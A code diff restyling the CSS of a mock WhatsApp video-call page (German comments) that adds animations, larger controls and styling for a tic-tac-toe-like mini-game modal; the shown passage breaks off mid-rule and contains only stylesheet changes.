@@ -3,8 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>WhatsApp</title>
+  <title>WhatsApp Videoanruf</title>
   <style>
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* RESET & BASIS-VARIABLEN */
+    /* ════════════════════════════════════════════════════════════════════ */
     * {
       margin: 0;
       padding: 0;
@@ -18,16 +21,27 @@
     :root {
       --wa-green: #25d366;
       --wa-green-dark: #128c7e;
+      --wa-green-light: #20b85a;
       --wa-dark-bg: #0a1f13;
       --wa-dark-lighter: #111b16;
+      --wa-dark-medium: #0d2818;
       --wa-text-primary: #ffffff;
       --wa-text-secondary: rgba(255,255,255,0.7);
       --wa-text-muted: rgba(255,255,255,0.5);
       --wa-border: rgba(255,255,255,0.1);
+      --wa-border-light: rgba(255,255,255,0.05);
+      --game-gold: #ffd700;
+      --game-gold-light: #ffed4e;
+      --error-red: #f04747;
+      --error-red-dark: #e63946;
+      --success-green: #43b581;
     }
 
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* HAUPT-BODY STYLING */
+    /* ════════════════════════════════════════════════════════════════════ */
     body {
-      font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', sans-serif;
+      font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', 'Roboto', sans-serif;
       background: linear-gradient(135deg, #0a1f13 0%, #0d2818 50%, #081510 100%);
       height: 100vh;
       width: 100vw;
@@ -38,6 +52,9 @@
       position: relative;
     }
 
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* HINTERGRUND ANIMATIONEN */
+    /* ════════════════════════════════════════════════════════════════════ */
     .bg {
       position: fixed;
       inset: 0;
@@ -50,13 +67,15 @@
       position: fixed;
       inset: 0;
       background: 
-        radial-gradient(circle at 20% 30%, rgba(37,211,102,0.08) 0%, transparent 50%),
-        radial-gradient(circle at 80% 70%, rgba(37,211,102,0.06) 0%, transparent 50%);
+        radial-gradient(circle at 20% 30%, rgba(37,211,102,0.1) 0%, transparent 50%),
+        radial-gradient(circle at 80% 70%, rgba(37,211,102,0.08) 0%, transparent 50%),
+        radial-gradient(circle at 50% 50%, rgba(37,211,102,0.05) 0%, transparent 50%);
       animation: pulse-glow 8s ease-in-out infinite;
+      pointer-events: none;
     }
 
     @keyframes pulse-glow {
-      0%, 100% { opacity: 0.5; }
+      0%, 100% { opacity: 0.4; }
       50% { opacity: 1; }
     }
 
@@ -80,9 +99,12 @@
           rgba(37,211,102,0.02) 4px
         );
       pointer-events: none;
+      z-index: 1;
     }
 
-    /* ── CALL VIEW ── */
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* ANRUF-ANSICHT */
+    /* ════════════════════════════════════════════════════════════════════ */
     .call-view {
       position: relative;
       z-index: 2;
@@ -93,14 +115,18 @@
       transition: opacity 0.3s ease;
     }
 
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* OBERE LEISTE (TOPBAR) */
+    /* ════════════════════════════════════════════════════════════════════ */
     .topbar {
       position: relative;
       z-index: 3;
       width: 100%;
-      padding: 20px 16px 12px;
-      background: linear-gradient(180deg, rgba(10,31,19,0.8) 0%, rgba(10,31,19,0.4) 100%);
-      backdrop-filter: blur(20px);
+      padding: 24px 20px 16px;
+      background: linear-gradient(180deg, rgba(10,31,19,0.9) 0%, rgba(10,31,19,0.5) 100%);
+      backdrop-filter: blur(25px);
       border-bottom: 1px solid var(--wa-border);
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
     }
 
     .status-bar {
@@ -109,16 +135,18 @@
       align-items: center;
       font-size: 12px;
       color: var(--wa-text-muted);
-      margin-bottom: 8px;
-      padding: 0 4px;
+      margin-bottom: 12px;
+      padding: 0 6px;
+      font-weight: 500;
     }
 
     .wa-label {
-      font-size: 13px;
+      font-size: 12px;
       color: var(--wa-text-secondary);
-      margin-bottom: 6px;
-      font-weight: 500;
-      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      text-transform: uppercase;
     }
 
     .caller-info {
@@ -126,28 +154,34 @@
     }
 
     .caller-name {
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 4px;
-      letter-spacing: -0.5px;
+      font-size: 32px;
+      font-weight: 800;
+      margin-bottom: 6px;
+      letter-spacing: -1px;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.3);
     }
 
     .call-status {
       font-size: 14px;
       color: var(--wa-text-secondary);
       font-weight: 500;
+      letter-spacing: 0.5px;
     }
 
     .timer {
-      font-size: 14px;
+      font-size: 16px;
       color: var(--wa-green);
       font-variant-numeric: tabular-nums;
-      margin-top: 4px;
+      margin-top: 6px;
       display: none;
-      font-weight: 600;
-      letter-spacing: 1px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-shadow: 0 0 10px rgba(37,211,102,0.3);
     }
 
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* AVATAR-BEREICH */
+    /* ════════════════════════════════════════════════════════════════════ */
     .avatar-section {
       flex: 1;
       display: flex;
@@ -156,53 +190,92 @@
       justify-content: center;
       position: relative;
       z-index: 2;
-      gap: 24px;
+      gap: 32px;
     }
 
     .avatar-wrap {
       position: relative;
-      animation: float 4s ease-in-out infinite;
+      animation: float-avatar 5s ease-in-out infinite;
+      filter: drop-shadow(0 20px 40px rgba(37,211,102,0.15));
     }
 
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); }
-      50% { transform: translateY(-12px); }
+    @keyframes float-avatar {
+      0%, 100% { transform: translateY(0px) rotateZ(0deg); }
+      50% { transform: translateY(-18px) rotateZ(1deg); }
     }
 
     .avatar-ring {
-      width: 140px;
-      height: 140px;
+      width: 160px;
+      height: 160px;
       border-radius: 50%;
-      background: rgba(37,211,102,0.15);
+      background: radial-gradient(circle at 30% 30%, rgba(37,211,102,0.25), rgba(37,211,102,0.08));
       display: flex;
       align-items: center;
       justify-content: center;
-      animation: ring-pulse 2.5s ease-in-out infinite;
-      border: 3px solid rgba(37,211,102,0.25);
-      box-shadow: 0 0 40px rgba(37,211,102,0.15);
+      animation: ring-pulse-strong 2.8s ease-in-out infinite;
+      border: 4px solid rgba(37,211,102,0.3);
+      box-shadow: 
+        0 0 50px rgba(37,211,102,0.2),
+        inset 0 0 30px rgba(37,211,102,0.1);
+      position: relative;
     }
 
-    @keyframes ring-pulse {
+    .avatar-ring::before {
+      content: '';
+      position: absolute;
+      inset: -8px;
+      border-radius: 50%;
+      border: 2px solid rgba(37,211,102,0.15);
+      animation: ring-outer 4s ease-in-out infinite;
+    }
+
+    .avatar-ring::after {
+      content: '';
+      position: absolute;
+      inset: -16px;
+      border-radius: 50%;
+      border: 1px solid rgba(37,211,102,0.1);
+      animation: ring-outer-2 5s ease-in-out infinite;
+    }
+
+    @keyframes ring-pulse-strong {
       0%, 100% {
-        box-shadow: 0 0 0 0 rgba(37,211,102,0.3), inset 0 0 20px rgba(37,211,102,0.1);
+        box-shadow: 
+          0 0 0 0 rgba(37,211,102,0.4),
+          inset 0 0 30px rgba(37,211,102,0.15);
       }
       50% {
-        box-shadow: 0 0 0 25px rgba(37,211,102,0.05), inset 0 0 20px rgba(37,211,102,0.2);
+        box-shadow: 
+          0 0 0 35px rgba(37,211,102,0.08),
+          inset 0 0 30px rgba(37,211,102,0.25);
       }
+    }
+
+    @keyframes ring-outer {
+      0%, 100% { transform: scale(1); opacity: 0.5; }
+      50% { transform: scale(1.15); opacity: 0.2; }
+    }
+
+    @keyframes ring-outer-2 {
+      0%, 100% { transform: scale(1); opacity: 0.3; }
+      50% { transform: scale(1.3); opacity: 0.1; }
     }
 
     .avatar {
-      width: 120px;
-      height: 120px;
+      width: 140px;
+      height: 140px;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 52px;
-      font-weight: 700;
+      font-size: 60px;
+      font-weight: 800;
       color: white;
-      box-shadow: 0 12px 48px rgba(0,0,0,0.5), inset -2px -2px 8px rgba(0,0,0,0.3);
-      transition: transform 0.3s, box-shadow 0.3s;
+      box-shadow: 
+        0 16px 60px rgba(0,0,0,0.6),
+        inset -3px -3px 12px rgba(0,0,0,0.4),
+        inset 2px 2px 8px rgba(255,255,255,0.15);
+      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
       position: relative;
       overflow: hidden;
     }
@@ -211,13 +284,24 @@
       content: '';
       position: absolute;
       inset: 0;
-      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.3) 0%, transparent 50%);
+      background: radial-gradient(circle at 35% 35%, rgba(255,255,255,0.4) 0%, transparent 50%);
+      border-radius: 50%;
+    }
+
+    .avatar::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 70% 70%, rgba(0,0,0,0.2) 0%, transparent 50%);
       border-radius: 50%;
     }
 
     .avatar:active {
-      transform: scale(0.95);
-      box-shadow: 0 8px 24px rgba(0,0,0,0.4), inset -2px -2px 8px rgba(0,0,0,0.3);
+      transform: scale(0.92);
+      box-shadow: 
+        0 8px 30px rgba(0,0,0,0.5),
+        inset -3px -3px 12px rgba(0,0,0,0.4),
+        inset 2px 2px 8px rgba(255,255,255,0.1);
     }
 
     .call-info-panel {
@@ -226,62 +310,79 @@
     }
 
     .call-info-panel p {
-      font-size: 13px;
+      font-size: 14px;
       color: var(--wa-text-secondary);
-      margin: 4px 0;
+      margin: 6px 0;
+      font-weight: 500;
+      letter-spacing: 0.3px;
     }
 
-    /* ── CONTROLS ── */
+    .call-info-panel span {
+      color: var(--wa-green);
+      font-weight: 700;
+    }
+
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* STEUERUNGEN (CONTROLS) */
+    /* ════════════════════════════════════════════════════════════════════ */
     .controls {
       position: fixed;
       bottom: 0;
       left: 0;
       right: 0;
-      padding: 20px 16px 48px;
+      padding: 24px 16px 56px;
       z-index: 10;
-      background: linear-gradient(180deg, rgba(10,31,19,0) 0%, rgba(10,31,19,0.95) 60%, rgba(10,31,19,1) 100%);
-      backdrop-filter: blur(20px);
+      background: linear-gradient(180deg, rgba(10,31,19,0) 0%, rgba(10,31,19,0.97) 50%, rgba(10,31,19,1) 100%);
+      backdrop-filter: blur(25px);
+      border-top: 1px solid var(--wa-border);
     }
 
     .controls-row {
       display: flex;
       justify-content: space-around;
       align-items: center;
-      margin-bottom: 28px;
-      gap: 12px;
+      margin-bottom: 32px;
+      gap: 16px;
     }
 
     .ctrl-btn {
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 10px;
+      gap: 12px;
       background: none;
       border: none;
       cursor: pointer;
       color: white;
-      padding: 8px;
+      padding: 12px;
       position: relative;
-      transition: transform 0.2s;
+      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
 
     .ctrl-btn:active {
-      transform: scale(0.92);
+      transform: scale(0.88);
+    }
+
+    .ctrl-btn:hover .ctrl-icon {
+      transform: scale(1.05);
     }
 
     .ctrl-icon {
-      width: 64px;
-      height: 64px;
+      width: 72px;
+      height: 72px;
       border-radius: 50%;
-      background: rgba(255,255,255,0.15);
+      background: linear-gradient(135deg, rgba(255,255,255,0.12) 0%, rgba(255,255,255,0.08) 100%);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 24px;
-      transition: all 0.15s;
-      backdrop-filter: blur(10px);
-      border: 1.5px solid rgba(37,211,102,0.2);
-      box-shadow: 0 8px 24px rgba(0,0,0,0.2), inset 0 1px 2px rgba(255,255,255,0.1);
+      font-size: 28px;
+      transition: all 0.3s ease;
+      backdrop-filter: blur(12px);
+      border: 1.5px solid rgba(37,211,102,0.25);
+      box-shadow: 
+        0 10px 28px rgba(0,0,0,0.25),
+        inset 0 1px 2px rgba(255,255,255,0.12),
+        0 0 20px rgba(37,211,102,0.1);
       position: relative;
       overflow: hidden;
     }
@@ -290,52 +391,204 @@
       content: '';
       position: absolute;
       inset: 0;
-      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.2) 0%, transparent 70%);
+      background: radial-gradient(circle at 35% 35%, rgba(255,255,255,0.25) 0%, transparent 60%);
       border-radius: 50%;
     }
 
+    .ctrl-icon::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      box-shadow: inset 0 0 10px rgba(0,0,0,0.2);
+    }
+
     .ctrl-icon:active {
-      transform: scale(0.88);
-      box-shadow: 0 4px 12px rgba(0,0,0,0.3), inset 0 1px 2px rgba(255,255,255,0.05);
+      transform: scale(0.85);
+      box-shadow: 
+        0 5px 15px rgba(0,0,0,0.3),
+        inset 0 1px 2px rgba(255,255,255,0.08),
+        0 0 10px rgba(37,211,102,0.05);
     }
 
     .ctrl-btn.toggled .ctrl-icon {
-      background: rgba(37,211,102,0.3);
-      border-color: rgba(37,211,102,0.5);
-      box-shadow: 0 0 24px rgba(37,211,102,0.4), inset 0 1px 2px rgba(255,255,255,0.1);
+      background: linear-gradient(135deg, rgba(37,211,102,0.4) 0%, rgba(37,211,102,0.2) 100%);
+      border-color: rgba(37,211,102,0.6);
+      box-shadow: 
+        0 0 32px rgba(37,211,102,0.5),
+        inset 0 1px 2px rgba(255,255,255,0.15),
+        inset 0 0 15px rgba(37,211,102,0.15);
     }
 
     .ctrl-label {
-      font-size: 11px;
+      font-size: 12px;
       color: var(--wa-text-secondary);
-      font-weight: 600;
-      letter-spacing: 0.3px;
-      transition: color 0.15s;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
     }
 
     .ctrl-btn.toggled .ctrl-label {
       color: var(--wa-green);
+      text-shadow: 0 0 8px rgba(37,211,102,0.5);
     }
 
     .end-row {
       display: flex;
       justify-content: center;
-      gap: 16px;
+      gap: 20px;
+      align-items: center;
+      flex-wrap: wrap;
     }
 
-    .end-btn {
-      width: 76px;
-      height: 76px;
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* SPIEL-BENACHRICHTIGUNGEN */
+    /* ════════════════════════════════════════════════════════════════════ */
+    .game-notification {
+      background: linear-gradient(135deg, rgba(255,215,0,0.25) 0%, rgba(37,211,102,0.15) 100%);
+      border: 2px solid var(--game-gold);
+      border-radius: 16px;
+      padding: 16px 20px;
+      font-size: 14px;
+      color: var(--game-gold);
+      font-weight: 700;
+      text-align: center;
+      animation: slide-in-down 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+      margin-bottom: 16px;
+      box-shadow: 0 0 25px rgba(255,215,0,0.3), inset 0 0 10px rgba(255,215,0,0.1);
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .game-notification::before {
+      content: '✨ ';
+    }
+
+    .game-notification::after {
+      content: ' ✨';
+    }
+
+    @keyframes slide-in-down {
+      from {
+        opacity: 0;
+        transform: translateY(-30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .warning-notification {
+      background: linear-gradient(135deg, rgba(240,71,71,0.2) 0%, rgba(230,57,70,0.15) 100%);
+      border: 2px solid var(--error-red);
+      border-radius: 16px;
+      padding: 12px 16px;
+      font-size: 12px;
+      color: var(--error-red);
+      font-weight: 600;
+      text-align: center;
+      animation: shake 0.4s ease;
+      margin-bottom: 12px;
+      box-shadow: 0 0 20px rgba(240,71,71,0.2);
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* SPIEL-BUTTON */
+    /* ════════════════════════════════════════════════════════════════════ */
+    .mini-game-btn {
+      width: 92px;
+      height: 92px;
       border-radius: 50%;
-      background: linear-gradient(135deg, #f04747 0%, #e63946 100%);
+      background: linear-gradient(135deg, rgba(255,215,0,0.3) 0%, rgba(37,211,102,0.2) 100%);
+      border: 3px dashed var(--game-gold);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 42px;
+      transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      box-shadow: 
+        0 0 40px rgba(255,215,0,0.5),
+        inset 0 0 20px rgba(255,215,0,0.2),
+        0 10px 35px rgba(255,215,0,0.15);
+      animation: game-pulse-intense 1.8s ease-in-out infinite;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .mini-game-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at center, rgba(255,215,0,0.3) 0%, transparent 70%);
+      animation: pulse-inner 1.8s ease-in-out infinite;
+    }
+
+    @keyframes game-pulse-intense {
+      0%, 100% {
+        transform: scale(1);
+        box-shadow: 
+          0 0 40px rgba(255,215,0,0.5),
+          inset 0 0 20px rgba(255,215,0,0.2),
+          0 10px 35px rgba(255,215,0,0.15);
+      }
+      50% {
+        transform: scale(1.12);
+        box-shadow: 
+          0 0 70px rgba(255,215,0,0.8),
+          inset 0 0 30px rgba(255,215,0,0.4),
+          0 15px 50px rgba(255,215,0,0.3);
+      }
+    }
+
+    @keyframes pulse-inner {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    .mini-game-btn:hover {
+      transform: scale(1.18);
+      box-shadow: 
+        0 0 80px rgba(255,215,0,0.9),
+        inset 0 0 35px rgba(255,215,0,0.5),
+        0 20px 60px rgba(255,215,0,0.4);
+    }
+
+    .mini-game-btn:active {
+      transform: scale(1.04);
+      box-shadow: 
+        0 0 40px rgba(255,215,0,0.6),
+        inset 0 0 20px rgba(255,215,0,0.2),
+        0 8px 25px rgba(255,215,0,0.2);
+    }
+
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* ENDE-BUTTON */
+    /* ════════════════════════════════════════════════════════════════════ */
+    .end-btn {
+      width: 84px;
+      height: 84px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--error-red) 0%, var(--error-red-dark) 100%);
       border: none;
       cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 28px;
-      box-shadow: 0 8px 32px rgba(240,71,71,0.5), inset 0 1px 2px rgba(255,255,255,0.2);
-      transition: all 0.15s;
+      font-size: 32px;
+      box-shadow: 
+        0 12px 40px rgba(240,71,71,0.6),
+        inset 0 1px 3px rgba(255,255,255,0.2),
+        0 0 25px rgba(240,71,71,0.3);
+      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
       position: relative;
       overflow: hidden;
     }
@@ -344,56 +597,54 @@
       content: '';
       position: absolute;
       inset: 0;
-      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.3) 0%, transparent 70%);
+      background: radial-gradient(circle at 35% 35%, rgba(255,255,255,0.35) 0%, transparent 60%);
       border-radius: 50%;
+    }
+
+    .end-btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
+    }
+
+    .end-btn:hover {
+      transform: scale(1.08);
+      box-shadow: 
+        0 16px 50px rgba(240,71,71,0.7),
+        inset 0 1px 3px rgba(255,255,255,0.25),
+        0 0 35px rgba(240,71,71,0.4);
     }
 
     .end-btn:active {
-      transform: scale(0.91);
-      box-shadow: 0 4px 16px rgba(240,71,71,0.4), inset 0 1px 2px rgba(255,255,255,0.1);
+      transform: scale(0.94);
+      box-shadow: 
+        0 6px 20px rgba(240,71,71,0.5),
+        inset 0 1px 3px rgba(255,255,255,0.15),
+        0 0 15px rgba(240,71,71,0.2);
     }
 
-    .mini-game-btn {
-      width: 64px;
-      height: 64px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, rgba(88,199,250,0.3) 0%, rgba(37,211,102,0.2) 100%);
-      border: 1.5px dashed var(--wa-green);
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 28px;
-      transition: all 0.2s;
-      box-shadow: 0 0 20px rgba(37,211,102,0.2);
-    }
-
-    .mini-game-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 30px rgba(37,211,102,0.4);
-    }
-
-    .mini-game-btn:active {
-      transform: scale(0.9);
-    }
-
-    /* ── GAME MODAL ── */
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* SPIEL-MODAL */
+    /* ════════════════════════════════════════════════════════════════════ */
     .game-modal {
       position: fixed;
       inset: 0;
       z-index: 200;
-      background: rgba(0,0,0,0.8);
+      background: rgba(0,0,0,0.88);
       display: none;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      backdrop-filter: blur(5px);
-      animation: modal-fade-in 0.3s ease;
+      backdrop-filter: blur(8px);
+      animation: modal-fade-in 0.4s ease;
+      padding: 16px;
     }
 
     @keyframes modal-fade-in {
-      from { opacity: 0; }
-      to { opacity: 1; }
+      from { opacity: 0; backdrop-filter: blur(0px); }
+      to { opacity: 1; backdrop-filter: blur(8px); }
     }
 
     .game-modal.active {
@@ -401,151 +652,342 @@
     }
 
     .game-container {
-      background: linear-gradient(135deg, #111b16 0%, #0d2818 100%);
-      border-radius: 24px;
-      padding: 32px;
-      max-width: 500px;
-      width: 90%;
-      border: 1px solid var(--wa-border);
-      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-      animation: modal-slide-up 0.4s ease;
-      max-height: 90vh;
+      background: linear-gradient(135deg, #111b16 0%, #0d2818 50%, #0a1f13 100%);
+      border-radius: 28px;
+      padding: 40px;
+      max-width: 550px;
+      width: 100%;
+      border: 2.5px solid var(--game-gold);
+      box-shadow: 
+        0 25px 80px rgba(255,215,0,0.4),
+        0 0 40px rgba(37,211,102,0.2),
+        inset 0 1px 2px rgba(255,255,255,0.1);
+      animation: modal-slide-up 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+      max-height: 92vh;
       overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: var(--wa-green) rgba(37,211,102,0.1);
+    }
+
+    .game-container::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .game-container::-webkit-scrollbar-track {
+      background: rgba(37,211,102,0.1);
+      border-radius: 4px;
+    }
+
+    .game-container::-webkit-scrollbar-thumb {
+      background: var(--wa-green);
+      border-radius: 4px;
     }
 
     @keyframes modal-slide-up {
-      from { transform: translateY(40px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
+      from { 
+        transform: translateY(60px) scale(0.9); 
+        opacity: 0; 
+      }
+      to { 
+        transform: translateY(0) scale(1); 
+        opacity: 1; 
+      }
     }
 
     .game-header {
       text-align: center;
-      margin-bottom: 24px;
+      margin-bottom: 32px;
+      position: relative;
+    }
+
+    .game-header::before {
+      content: '';
+      position: absolute;
+      top: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60px;
+      height: 60px;
+      background: radial-gradient(circle at 35% 35%, var(--game-gold), rgba(255,215,0,0.3));
+      border-radius: 50%;
+      filter: blur(15px);
+      animation: glow-pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes glow-pulse {
+      0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.6; }
+      50% { transform: translateX(-50%) scale(1.2); opacity: 0.9; }
     }
 
     .game-title {
-      font-size: 24px;
-      font-weight: 700;
-      color: var(--wa-green);
-      margin-bottom: 8px;
+      font-size: 36px;
+      font-weight: 900;
+      color: var(--game-gold);
+      margin-bottom: 12px;
+      text-shadow: 0 0 20px rgba(255,215,0,0.6), 0 4px 10px rgba(0,0,0,0.5);
+      letter-spacing: 1px;
+      animation: title-bounce 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    @keyframes title-bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .game-subtitle {
+      font-size: 14px;
+      color: var(--wa-text-secondary);
+      margin-bottom: 6px;
+      font-weight: 600;
+      letter-spacing: 0.3px;
     }
 
     .game-description {
       font-size: 13px;
       color: var(--wa-text-secondary);
+      line-height: 1.5;
+      margin-bottom: 8px;
     }
 
+    .game-instructions {
+      font-size: 12px;
+      color: var(--wa-text-muted);
+      background: rgba(37,211,102,0.08);
+      border-left: 3px solid var(--wa-green);
+      padding: 12px 14px;
+      border-radius: 8px;
+      margin-top: 12px;
+    }
+
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* SPIEL-STATISTIKEN */
+    /* ════════════════════════════════════════════════════════════════════ */
+    .game-stats {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 14px;
+      margin-bottom: 28px;
+      margin-top: 20px;
+    }
+
+    .stat-box {
+      background: linear-gradient(135deg, rgba(37,211,102,0.12) 0%, rgba(37,211,102,0.06) 100%);
+      border: 1.5px solid rgba(37,211,102,0.3);
+      border-radius: 14px;
+      padding: 16px;
+      text-align: center;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .stat-box::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 50% 0%, rgba(37,211,102,0.15), transparent 70%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .stat-box:hover {
+      border-color: rgba(37,211,102,0.6);
+      background: linear-gradient(135deg, rgba(37,211,102,0.18) 0%, rgba(37,211,102,0.1) 100%);
+      box-shadow: 0 0 20px rgba(37,211,102,0.2);
+    }
+
+    .stat-box:hover::before {
+      opacity: 1;
+    }
+
+    .stat-label {
+      font-size: 10px;
+      color: var(--wa-text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
+      margin-bottom: 6px;
+      font-weight: 700;
+    }
+
+    .stat-value {
+      font-size: 28px;
+      font-weight: 900;
+      color: var(--wa-green);
+      text-shadow: 0 0 15px rgba(37,211,102,0.4);
+      font-variant-numeric: tabular-nums;
+    }
+
+    .stat-info {
+      font-size: 10px;
+      color: var(--wa-text-muted);
+      margin-top: 4px;
+    }
+
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* SPIEL-BOARD */
+    /* ════════════════════════════════════════════════════════════════════ */
     .game-board {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      margin: 24px 0;
-      padding: 20px;
-      background: rgba(37,211,102,0.05);
-      border-radius: 16px;
-      border: 1px solid var(--wa-border);
+      gap: 14px;
+      margin: 28px 0;
+      padding: 24px;
+      background: linear-gradient(135deg, rgba(37,211,102,0.08) 0%, rgba(37,211,102,0.04) 100%);
+      border-radius: 18px;
+      border: 1.5px solid rgba(37,211,102,0.2);
+      box-shadow: inset 0 0 20px rgba(0,0,0,0.2);
     }
 
     .game-cell {
       width: 100%;
       aspect-ratio: 1;
-      background: linear-gradient(135deg, rgba(37,211,102,0.15) 0%, rgba(37,211,102,0.08) 100%);
-      border: 2px solid var(--wa-border);
-      border-radius: 12px;
+      background: linear-gradient(135deg, rgba(37,211,102,0.18) 0%, rgba(37,211,102,0.08) 100%);
+      border: 2.5px solid rgba(37,211,102,0.3);
+      border-radius: 14px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 28px;
-      font-weight: 700;
+      font-size: 32px;
+      font-weight: 900;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
       color: var(--wa-green);
+      box-shadow: 
+        0 8px 20px rgba(0,0,0,0.2),
+        inset 0 1px 2px rgba(255,255,255,0.08);
+      position: relative;
+      overflow: hidden;
     }
 
-    .game-cell:hover {
-      background: linear-gradient(135deg, rgba(37,211,102,0.25) 0%, rgba(37,211,102,0.15) 100%);
-      border-color: var(--wa-green);
-      transform: scale(1.05);
+    .game-cell::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 35% 35%, rgba(255,255,255,0.2) 0%, transparent 60%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
     }
 
-    .game-cell:active {
+    .game-cell:not(.disabled):hover {
+      background: linear-gradient(135deg, rgba(37,211,102,0.3) 0%, rgba(37,211,102,0.18) 100%);
+      border-color: rgba(37,211,102,0.6);
+      transform: scale(1.08);
+      box-shadow: 
+        0 12px 30px rgba(37,211,102,0.3),
+        inset 0 1px 2px rgba(255,255,255,0.12);
+    }
+
+    .game-cell:not(.disabled):hover::before {
+      opacity: 1;
+    }
+
+    .game-cell:active:not(.disabled) {
       transform: scale(0.95);
+      box-shadow: 
+        0 4px 12px rgba(0,0,0,0.15),
+        inset 0 1px 2px rgba(255,255,255,0.05);
     }
 
     .game-cell.disabled {
       cursor: not-allowed;
-      opacity: 0.5;
+      opacity: 0.45;
     }
 
-    .game-stats {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      margin-bottom: 20px;
+    .game-cell.correct {
+      animation: cell-correct 0.5s ease;
+      background: linear-gradient(135deg, rgba(67,181,129,0.3) 0%, rgba(67,181,129,0.15) 100%);
+      border-color: var(--success-green);
+      color: var(--success-green);
     }
 
-    .stat-box {
-      background: rgba(37,211,102,0.1);
-      border: 1px solid var(--wa-border);
-      border-radius: 12px;
-      padding: 12px;
-      text-align: center;
+    @keyframes cell-correct {
+      0% { transform: scale(1) rotate(0deg); }
+      50% { transform: scale(1.15) rotate(5deg); }
+      100% { transform: scale(1) rotate(0deg); }
     }
 
-    .stat-label {
-      font-size: 11px;
-      color: var(--wa-text-secondary);
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      margin-bottom: 4px;
+    .game-cell.wrong {
+      animation: cell-wrong 0.4s ease;
     }
 
-    .stat-value {
-      font-size: 20px;
-      font-weight: 700;
-      color: var(--wa-green);
+    @keyframes cell-wrong {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-8px); }
+      75% { transform: translateX(8px); }
     }
 
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* SPIEL-STEUERUNGEN */
+    /* ════════════════════════════════════════════════════════════════════ */
     .game-controls {
       display: flex;
-      gap: 12px;
